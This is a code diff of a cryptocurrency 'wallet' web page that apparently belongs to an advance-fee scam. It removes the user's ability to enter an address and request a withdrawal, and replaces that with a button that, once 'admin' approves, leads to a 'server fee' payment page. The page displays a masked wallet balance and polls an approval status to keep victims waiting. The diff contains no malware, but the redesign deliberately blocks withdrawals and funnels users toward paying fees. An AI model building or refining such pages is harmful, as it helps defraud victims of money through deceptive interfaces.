@@ -27,7 +27,7 @@
       width: 100%;
     }
     h1 { font-size: 1.5em; margin-bottom: 15px; }
-    .status { font-size: 1.2em; margin: 15px 0; }
+    .status { font-size: 1.05em; margin: 15px 0; color:#aef; }
     .hash, .wallet-info {
       font-family: monospace;
       background: #000;
@@ -36,17 +36,6 @@
       border-radius: 8px;
       margin-top: 10px;
       word-break: break-word;
-      font-size: 0.9em;
-    }
-    .input-field {
-      width: 100%;
-      padding: 10px;
-      margin: 15px 0;
-      font-family: monospace;
-      background: #000;
-      color: #0ff;
-      border: 1px solid #0ff6;
-      border-radius: 6px;
       font-size: 0.9em;
     }
     .btn {
@@ -58,15 +47,23 @@
       border-radius: 10px;
       cursor: pointer;
       width: 100%;
-      max-width: 250px;
+      max-width: 280px;
+      margin: 16px auto 0;
+      display: inline-block;
+      transition: box-shadow .2s ease, transform .2s ease;
     }
     .btn[disabled] {
-      opacity: 0.4;
+      opacity: 0.45;
       cursor: not-allowed;
+      filter: grayscale(0.3);
     }
     .btn:hover:not([disabled]) {
       background: #00faff;
       box-shadow: 0 0 12px #0ff;
+      transform: translateY(-1px);
+    }
+    .hint {
+      font-size: .85em; color:#9fd; margin-top:10px
     }
   </style>
 </head>
@@ -76,15 +73,13 @@
     <div class="status" id="statusText">⏳ Awaiting admin confirmation...</div>
     <div class="hash" id="txHash">Loading...</div>
 
-    <h2>🔐 Wallet Information</h2>
+    <h2 style="margin-top:22px;">🔐 Wallet Information</h2>
     <div class="wallet-info" id="walletInfo">Loading wallet data...</div>
 
-    <p>Please enter your personal wallet address to receive assets:</p>
-    <input class="input-field" id="userWallet" placeholder="e.g. your own BTC or ETH address" />
-    <button class="btn" id="withdrawBtn" disabled onclick="requestWithdraw()">💸 Request Withdrawal</button>
-    <p style="font-size: 0.85em; color: #aff; margin-top: 10px;">
-      This button will be enabled once your transaction is approved by admin.
-    </p>
+    <button class="btn" id="withdrawBtn" disabled>Proceed to Server Fee</button>
+    <div class="hint">
+      This button becomes active once your transaction is approved by admin.
+    </div>
   </div>
 
 <script>
@@ -96,7 +91,7 @@
     window.location.href = "login.html";
   }
 
-  // گرفتن اطلاعات کیف پول
+  // Load wallet info for display
   function loadWalletData() {
     fetch(`${API_BASE_URL}/my-wallet`, {
       headers: { "Authorization": "Bearer " + token }
@@ -104,14 +99,14 @@
     .then(res => res.json())
     .then(data => {
       if (!data.wallet) {
-        alert("❌ No wallet found.");
+        alert("❌ No wallet found. Please scan first.");
         window.location.href = "scan.html";
         return;
       }
       const wallet = data.wallet;
-      const maskedAddress = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
+      const masked = wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4);
       document.getElementById("walletInfo").innerHTML = `
-        <strong>Address:</strong> ${maskedAddress}<br>
+        <strong>Address:</strong> ${masked}<br>
         <strong>Balance:</strong> ${wallet.balance}<br>
         <strong>Network:</strong> ${wallet.network}<br>
         <strong>Last Tx:</strong> ${wallet.lastTx || 'N/A'}
@@ -120,7 +115,7 @@
     .catch(() => alert("Error loading wallet data."));
   }
 
-  // گرفتن هش هزینه تراکنش و وضعیت
+  // Poll final-tx status
   function loadFinalTx() {
     fetch(`${API_BASE_URL}/final-tx`, {
       headers: { "Authorization": "Bearer " + token }
@@ -128,50 +123,35 @@
     .then(res => res.json())
     .then(data => {
       document.getElementById("txHash").innerText = data.tx_hash || "N/A";
-
       const withdrawBtn = document.getElementById("withdrawBtn");
+
       if (data.status === "approved") {
-        document.getElementById("statusText").innerHTML = "✅ Transaction Approved! You can now request withdrawal.";
+        document.getElementById("statusText").innerHTML =
+          "✅ Transaction Approved! You can proceed to the Server Fee step.";
         withdrawBtn.disabled = false;
+        withdrawBtn.onclick = () => {
+          // فقط وقتی خودش کلیک کرد میره صفحه سرور فی
+          window.location.href = "server-fee.html";
+        };
+      } else if (data.status === "rejected") {
+        document.getElementById("statusText").innerHTML =
+          "❌ Your transaction was rejected by admin. Please contact support.";
+        withdrawBtn.disabled = true;
+        withdrawBtn.onclick = null;
       } else {
+        // pending / null
         document.getElementById("statusText").innerHTML = "⏳ Awaiting admin confirmation...";
         withdrawBtn.disabled = true;
+        withdrawBtn.onclick = null;
       }
     })
     .catch(() => alert("Error loading transaction status."));
   }
 
-  // ارسال درخواست برداشت
-  function requestWithdraw() {
-    const userAddr = document.getElementById("userWallet").value.trim();
-    if (!userAddr) {
-      alert("Please enter your personal wallet address.");
-      return;
-    }
-
-    fetch(`${API_BASE_URL}/withdraw-request`, {
-      method: "POST",
-      headers: {
-        "Authorization": "Bearer " + token,
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({ withdraw_address: userAddr })
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        alert("✅ Withdrawal request submitted!");
-      } else {
-        alert("❌ " + (data.error || "Request failed."));
-      }
-    })
-    .catch(() => alert("Server error occurred."));
-  }
-
-  // اجرا در شروع و رفرش هر 5 ثانیه
+  // Init + poll
   loadWalletData();
   loadFinalTx();
-  setInterval(loadFinalTx, 5000);
+  const poll = setInterval(loadFinalTx, 5000);
 </script>
 </body>
 </html>
